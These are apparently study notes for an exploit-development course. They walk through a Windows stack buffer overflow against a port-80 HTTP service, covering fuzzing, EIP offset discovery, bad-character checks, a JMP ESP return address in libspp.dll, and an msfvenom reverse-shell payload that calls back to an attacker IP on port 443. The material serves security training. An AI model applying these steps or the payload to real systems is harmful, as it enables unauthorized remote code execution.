# Windows Buffer Overflows

In this example we target an application serving HTTP requests on port 80.

* Use SysInternals TCPview tool to identif process number listneing on port 80.
* Must open Immunity Debugger as administrator.
* File > Attach and attach the running process.
* This will pause program execution, resume it by pressing F9.
* Run the python fuzzer against the application.
* Watch for the overflow as EIP points to 41414141.
* Will crash the application - restart in services.

A fuzzer is eneration-based if it creates malformed application inputs from scratch, following things like file format or network protocol specifications.  
A mutation-based fuzzer changes existing inputs by using techniques like bit-flipping to create a malformed variant of the original input.  
A fuzzer that is aware of the application input format is a smart fuzzer.

### Controlling EIP

To get control of the EIP we need to know exactly where to write into it. Fastest way is to use a pattern and identify the offset in the EIP:  
```bash
locate pattern_create
msf-pattern_create -h

msf-pattern_create -l 800

# Update python script to use the generated payload.
# Crash the program with the payload.
# Note the EIP contents

# Find the offset with the hex in the EIP
msf-pattern_offset -l 800 -q 42306142

# Update the script to load to EIP:
  filler = "A" * 780
  eip = "B" * 4
  buffer = "C" * 16

  inputBuffer = filler + eip + buffer

# Retry and verify EIP contains BBBB.
```

### Shellcode Space

We need around 350-400 bytes of space for our shellcode. To find enough space we can increase the size of the buffer and see if it changes the crash:
```python
filler = "A" * 780
eip = "B" * 4
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))

inputBuffer = filler + eip + offset + buffer
```

We can then overflow again, and identify the last address minus the first address for DDDD to identify the available space.

### Check for Bad Characters

* Iterate using the python script for bad charaters.
* Right click on ESP and View in Dump. Look for the last character before it bombs out.
* Remove that character from the script and repeat.


### Finding a Return Address

* Attach program in Immunity.
* Run !mona modules
* Look for library with no protection flags including NXCompat (DEP protection).
* Look for library with no bad characters in address.  

If DEP is enabled, look for the address in the .text code segment.  

Find the opcode equivalent of JMP ESP:
```bash
msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > 
```

Search for JMP ESP using hex representation in the located library with `mona.py find`. Use `-s` for the escaped hex string, and `-m` for the required module name:  
`!mona find -s "\xff\xe4" -m "libspp.dll"`  

Note the resultant address and check for bad characters: 0x10090c83. We can then click on the 'go to address in dissasembler' button and enter the address. This should result in a JMP ESP instruction.  

The idea is to redirect EIP to this address at time of crash, and the JMP ESP instruction will execute and lead into the shellcode.

Enter the EIP variable to reflect the new address. Note the reversed order due to endianness. In little endian format the low-order byte of the number is stored in memory at the lowest address, and the high-order byte at the highest address. Therefore, we have to store the return address in reverse order in our buffer for the CPU to interpret it correctly in memory.

```python
eip = "\x83\x0c\x09\x10"
```

Use F2 to place a breakpoint at this address to see if it is reached. If reached, press F7 to step into the instruction and we should arrive at our dummy shellcode.

### Generating Shellcode with Metasploit

List the payloads:  
`msfvenom -l payloads`

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.149 LPORT=443 -f c`  
Works pretty easily to generate shellcode, except it will contain bad characters such as null bytes. A polymorphic encoder, shikata_ga_nai can be used to encode shellcode and inform the encoder of known bad characters with `-b`.  

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.149 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`  

We have to account for decoding the shellocde. GetPC routines looking ahead mangle some bytes of the decoder itself and crash the target process. Adjusting ESP backwards is another method, or creating a 'landing pad' for the JMP ESP to continue onto the payload. This is done by prepending No OPeration (NOP) instructions. This allows the CPU to slide through the NOPs until the payload is reached. In doing so, the stack pointer is far enough away foom the decoder that it does not corrupt the shellcode when the GetPC routine overwrites a few bytes on the stack.
















